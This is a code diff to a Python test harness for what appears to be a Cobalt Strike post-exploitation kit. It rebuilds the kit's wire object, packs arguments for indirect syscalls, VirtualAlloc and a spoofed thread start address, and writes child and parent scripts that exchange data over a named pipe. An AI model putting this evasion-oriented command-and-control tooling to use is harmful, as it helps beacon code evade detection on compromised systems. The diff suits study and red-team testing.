@@ -35,10 +35,17 @@ def L(b):
     return struct.pack(">i", len(b)) + b
 
 
-# bt_hello_wire.hex (C-24 artifact) = [8B head][380B body ending at entry]
-# with the final argsLen ALREADY missing; bof_extract's real output is one
-# 4-byte argsLen longer. Rebuild the complete object: body + argsLen=0.
-WIRE_KIT = FULL + struct.pack(">i", 0)
+# bt_hello_wire.hex (C-24 artifact) = [8B CB head][380B body ending at
+# entry], final argsLen missing. 4.12 dialect probe: the official kit cna
+# strips only 4 - consistent with a bof_extract output that has NO 8-byte
+# CommandBuilder prefix (removed in 4.10+). Test both forms:
+#   KIT_WIRE_MODE=prefix -> FULL + argsLen(0)  (with CB head)
+#   otherwise           -> FULL[8:] + argsLen(0) (headless, official shape)
+import os as _os
+if _os.environ.get("KIT_WIRE_MODE") == "prefix":
+    WIRE_KIT = FULL + struct.pack(">i", 0)
+else:
+    WIRE_KIT = FULL[8:] + struct.pack(">i", 0)
 
 # packed user args (first-shot iiizzb): runOnce=1 alloc=2(VirtualAlloc)
 # syscall=1(indirect) threadStart="ntdll.dll!RtlUserThreadStart+0x21"
@@ -74,7 +81,7 @@ def patch_kit(data):
 
 
 CHILD = r"C:\Users\Public\kit2_child.py"
-open(CHILD, "w").write(r'''
+_CHILD_SRC_PLACEHOLDER = (r'''
 import ctypes, struct, sys, time, os
 from ctypes import wintypes
 sys.path.insert(0, r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\tools")
@@ -109,9 +116,11 @@ print("SURVIVED 60s", flush=True)
 ''')
 
 PARENT = r"C:\Users\Public\kit2_parent.py"
-open(PARENT, "w").write(r'''
+_PARENT_SRC_PLACEHOLDER = (r'''
 import time, struct, ctypes
 from ctypes import wintypes
+k32 = ctypes.windll.kernel32
+k32.CreateFileW.restype = wintypes.HANDLE
 GENERIC_RW = 0x80000000 | 0x40000000
 OPEN_EXISTING = 3
 CTRL = r"\\.\pipe\kit_ctrl2"
@@ -119,8 +128,8 @@ CTRL = r"\\.\pipe\kit_ctrl2"
 def open_pipe(name, timeout=20):
     t0 = time.time()
     while time.time() - t0 < timeout:
-        h = ctypes.windll.kernel32.CreateFileW(name, GENERIC_RW, 0, None, OPEN_EXISTING, 0, None)
-        if h != -1 and h != 0:
+        h = k32.CreateFileW(name, GENERIC_RW, 0, None, OPEN_EXISTING, 0, None)
+        if h and h != wintypes.HANDLE(-1).value:
             return h
         time.sleep(0.3)
     return None
@@ -134,7 +143,7 @@ t0 = time.time()
 while time.time() - t0 < 25:
     buf = ctypes.create_string_buffer(65536)
     got = wintypes.DWORD(0)
-    if ctypes.windll.kernel32.ReadFile(h, buf, 65536, ctypes.byref(got), None) and got.value:
+    if k32.ReadFile(h, buf, 65536, ctypes.byref(got), None) and got.value:
         chunk = buf.raw[:got.value]
         out += chunk
         printable = bytes(c if 32 <= c < 127 else 46 for c in chunk[:96])
@@ -144,8 +153,18 @@ while time.time() - t0 < 25:
 print("total:", len(out))
 ''')
 
+# File writes happen ONLY on explicit main() - importing this module (as the
+# gated experiment drivers and the child do) must NOT clobber the harness
+# files other drivers just wrote (import-time side effects cost a full day:
+# the child's import restored the STALE parent and every experiment silently
+# tested the old code path).
+def write_harness_files():
+    open(CHILD, "w").write(_CHILD_SRC_PLACEHOLDER)
+    open(PARENT, "w").write(_PARENT_SRC_PLACEHOLDER)
+
 
 def main():
+    write_harness_files()
     p = subprocess.Popen([sys.executable, "-I", CHILD], cwd=r"C:\Users\Public",
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     time.sleep(2)
